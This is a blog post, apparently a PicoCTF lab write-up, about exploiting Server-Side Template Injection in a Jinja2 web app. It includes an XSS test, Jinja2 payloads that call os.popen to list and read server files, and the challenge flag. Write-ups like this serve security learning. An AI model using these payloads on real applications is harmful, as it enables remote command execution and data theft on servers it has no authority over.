<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>PicoCTF Writeup #492 | nullvm</title>
<meta name="keywords" content="">
<meta name="description" content="PicoCTF Writeup – Server-Side Template Injection (SSTI)
Recently, I played around with a PicoCTF challenge 492. The challenge looked like a simple web app that lets you &ldquo;announce whatever you want.&rdquo; Naturally, I fired up my terminal and started poking at it with curl. By the way, we can also visit the website and experiment with the form instead.
curl -X GET http://rescued-float.picoctf.net:49878/announce -i
Response:
HTTP/1.1 405 METHOD NOT ALLOWED
Allow: POST, OPTIONS
Looks like only POST is allowed, so I retried with:">
<meta name="author" content="Deni Andrian Prayoga">
<link rel="canonical" href="/posts/picoctf-writeup-ssti/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.e13cd26641e1575c2d0e802b3928b9691188ff15800ee9dab119a64fbfb2cfda.css" integrity="sha256-4TzSZkHhV1wtDoArOSi5aRGI/xWADunasRmmT7&#43;yz9o=" rel="preload stylesheet" as="style">
<link rel="icon" href="/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="mask-icon" href="/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="/posts/picoctf-writeup-ssti/">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200..1000;1,200..1000&display=swap" rel="stylesheet">

<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="/posts/picoctf-writeup-ssti/">
  <meta property="og:site_name" content="nullvm">
  <meta property="og:title" content="PicoCTF Writeup #492">
  <meta property="og:description" content="PicoCTF Writeup – Server-Side Template Injection (SSTI) Recently, I played around with a PicoCTF challenge 492. The challenge looked like a simple web app that lets you “announce whatever you want.” Naturally, I fired up my terminal and started poking at it with curl. By the way, we can also visit the website and experiment with the form instead.
curl -X GET http://rescued-float.picoctf.net:49878/announce -i Response:
HTTP/1.1 405 METHOD NOT ALLOWED Allow: POST, OPTIONS Looks like only POST is allowed, so I retried with:">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-19T11:09:54+07:00">
    <meta property="article:modified_time" content="2025-08-19T11:09:54+07:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PicoCTF Writeup #492">
<meta name="twitter:description" content="PicoCTF Writeup – Server-Side Template Injection (SSTI)
Recently, I played around with a PicoCTF challenge 492. The challenge looked like a simple web app that lets you &ldquo;announce whatever you want.&rdquo; Naturally, I fired up my terminal and started poking at it with curl. By the way, we can also visit the website and experiment with the form instead.
curl -X GET http://rescued-float.picoctf.net:49878/announce -i
Response:
HTTP/1.1 405 METHOD NOT ALLOWED
Allow: POST, OPTIONS
Looks like only POST is allowed, so I retried with:">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "/posts/"
    }
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "PicoCTF Writeup #492",
      "item": "/posts/picoctf-writeup-ssti/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PicoCTF Writeup #492",
  "name": "PicoCTF Writeup #492",
  "description": "PicoCTF Writeup – Server-Side Template Injection (SSTI) Recently, I played around with a PicoCTF challenge 492. The challenge looked like a simple web app that lets you \u0026ldquo;announce whatever you want.\u0026rdquo; Naturally, I fired up my terminal and started poking at it with curl. By the way, we can also visit the website and experiment with the form instead.\ncurl -X GET http://rescued-float.picoctf.net:49878/announce -i Response:\nHTTP/1.1 405 METHOD NOT ALLOWED Allow: POST, OPTIONS Looks like only POST is allowed, so I retried with:\n",
  "keywords": [
    
  ],
  "articleBody": "PicoCTF Writeup – Server-Side Template Injection (SSTI) Recently, I played around with a PicoCTF challenge 492. The challenge looked like a simple web app that lets you “announce whatever you want.” Naturally, I fired up my terminal and started poking at it with curl. By the way, we can also visit the website and experiment with the form instead.\ncurl -X GET http://rescued-float.picoctf.net:49878/announce -i Response:\nHTTP/1.1 405 METHOD NOT ALLOWED Allow: POST, OPTIONS Looks like only POST is allowed, so I retried with:\ncurl -X POST http://rescued-float.picoctf.net:49878/announce -i This time, I got a 200 OK. Sweet — we can actually interact with the app.\nFirst Thoughts The description said:\n“I made a cool website where you can announce whatever you want! I heard templating is a cool and modular way to build web apps!”\nThat last line screamed templating. My first instinct was to try some basic XSS. Sure enough:\n\u003cscript\u003ealert(\"HELO\")\u003c/script\u003e triggered an alert box. Nice, but XSS wasn’t the way to the flag.\nPivot to SSTI The title of the challenge hinted at Server-Side Template Injection (SSTI). From the headers I noticed the app was running Werkzeug (Python/3.8). That strongly suggested Jinja2 templating under the hood.\nI tested with some Jinja syntax:\n{{}} and got an Internal Server Error. That confirmed I was on the right track — this was a template engine at work.\nDigging Deeper Here’s where I hit a wall. I’d never really done an SSTI attack before. After some research, I learned about Python’s MRO (Method Resolution Order) and how it could be abused to reach Python internals, including modules like os.\nTurns out you can chain through Jinja’s builtins and reach Python’s os library. Once you can execute system commands, it’s game over.\nPayload to list files:\n{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}} That revealed a file named flag.\nPayload to read it:\n{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}} And boom — got the flag.\nThe Flag picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823} Takeaways Don’t stop at XSS — sometimes it’s just a red herring. Jinja2 + careless input handling = a playground for SSTI. The Method Resolution Order (MRO) trick is incredibly powerful when exploring Python internals. This was my first real SSTI exploit, and it was a fun rabbit hole to fall into. Definitely a good reminder of how dangerous improper template handling can be.\n",
  "wordCount" : "379",
  "inLanguage": "en",
  "datePublished": "2025-08-19T11:09:54+07:00",
  "dateModified": "2025-08-19T11:09:54+07:00",
  "author":{
    "@type": "Person",
    "name": "Deni Andrian Prayoga"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/picoctf-writeup-ssti/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nullvm",
    "logo": {
      "@type": "ImageObject",
      "url": "/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="/" accesskey="h" title="nullvm (Alt + H)">nullvm</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="/posts" title="Post">
                    <span>Post</span>
                </a>
            </li>
            <li>
                <a href="/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      PicoCTF Writeup #492
    </h1>
    <div class="post-meta"><span title='2025-08-19 11:09:54 +0700 WIB'>August 19, 2025</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Deni Andrian Prayoga&nbsp;|&nbsp;<a href="https://github.com/nullvm/nullvm.github.io-precompiled/tree/main/content/en/posts/picoctf-writeup-ssti.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>

</div>
  </header> 
  <div class="post-content"><h2 id="picoctf-writeup--server-side-template-injection-ssti">PicoCTF Writeup – Server-Side Template Injection (SSTI)<a hidden class="anchor" aria-hidden="true" href="#picoctf-writeup--server-side-template-injection-ssti">#</a></h2>
<p>Recently, I played around with a PicoCTF <a href="https://play.picoctf.org/practice/challenge/492">challenge 492</a>. The challenge looked like a simple web app that lets you &ldquo;announce whatever you want.&rdquo; Naturally, I fired up my terminal and started poking at it with <code>curl</code>. By the way, we can also visit the website and experiment with the form instead.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X GET http://rescued-float.picoctf.net:49878/announce -i
</span></span></code></pre></div><p>Response:</p>
<pre tabindex="0"><code>HTTP/1.1 405 METHOD NOT ALLOWED
Allow: POST, OPTIONS
</code></pre><p>Looks like only <code>POST</code> is allowed, so I retried with:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST http://rescued-float.picoctf.net:49878/announce -i
</span></span></code></pre></div><p>This time, I got a <code>200 OK</code>. Sweet — we can actually interact with the app.</p>
<h2 id="first-thoughts">First Thoughts<a hidden class="anchor" aria-hidden="true" href="#first-thoughts">#</a></h2>
<p>The description said:</p>
<blockquote>
<p>“I made a cool website where you can announce whatever you want!
I heard templating is a cool and modular way to build web apps!”</p></blockquote>
<p>That last line screamed <em>templating</em>. My first instinct was to try some basic XSS. Sure enough:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#e06c75">script</span>&gt;<span style="color:#e06c75">alert</span>(<span style="color:#98c379">&#34;HELO&#34;</span>)&lt;/<span style="color:#e06c75">script</span>&gt;
</span></span></code></pre></div><p>triggered an alert box. Nice, but XSS wasn’t the way to the flag.</p>
<h2 id="pivot-to-ssti">Pivot to SSTI<a hidden class="anchor" aria-hidden="true" href="#pivot-to-ssti">#</a></h2>
<p>The title of the challenge hinted at <strong>Server-Side Template Injection (SSTI)</strong>. From the headers I noticed the app was running <strong>Werkzeug (Python/3.8)</strong>. That strongly suggested <strong>Jinja2</strong> templating under the hood.</p>
<p>I tested with some Jinja syntax:</p>
<pre tabindex="0"><code>{{}}
</code></pre><p>and got an <strong>Internal Server Error</strong>. That confirmed I was on the right track — this was a template engine at work.</p>
<h2 id="digging-deeper">Digging Deeper<a hidden class="anchor" aria-hidden="true" href="#digging-deeper">#</a></h2>
<p>Here’s where I hit a wall. I’d never really done an SSTI attack before. After some research, I learned about Python’s <strong>MRO (Method Resolution Order)</strong> and how it could be abused to reach Python internals, including modules like <code>os</code>.</p>
<p>Turns out you can chain through Jinja’s builtins and reach Python’s <code>os</code> library. Once you can execute system commands, it’s game over.</p>
<p>Payload to list files:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jinja" data-lang="jinja"><span style="display:flex;"><span><span style="color:#7f848e">{{</span><span style="color:#e06c75">request.application.__globals__.__builtins__.__import__</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;os&#39;</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">.popen</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;ls&#39;</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">.read</span><span style="color:#56b6c2">()</span><span style="color:#7f848e">}}</span>
</span></span></code></pre></div><p>That revealed a file named <code>flag</code>.</p>
<p>Payload to read it:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jinja" data-lang="jinja"><span style="display:flex;"><span><span style="color:#7f848e">{{</span><span style="color:#e06c75">request.application.__globals__.__builtins__.__import__</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;os&#39;</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">.popen</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;cat flag&#39;</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">.read</span><span style="color:#56b6c2">()</span><span style="color:#7f848e">}}</span>
</span></span></code></pre></div><p>And boom — got the flag.</p>
<h2 id="the-flag">The Flag<a hidden class="anchor" aria-hidden="true" href="#the-flag">#</a></h2>
<pre tabindex="0"><code>picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}
</code></pre><h2 id="takeaways">Takeaways<a hidden class="anchor" aria-hidden="true" href="#takeaways">#</a></h2>
<ul>
<li>Don’t stop at XSS — sometimes it’s just a red herring.</li>
<li>Jinja2 + careless input handling = a playground for SSTI.</li>
<li>The Method Resolution Order (MRO) trick is incredibly powerful when exploring Python internals.</li>
</ul>
<p>This was my first real SSTI exploit, and it was a fun rabbit hole to fall into. Definitely a good reminder of how dangerous improper template handling can be.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer><div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "deniandriancode-github-io" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="/">nullvm</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>


<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
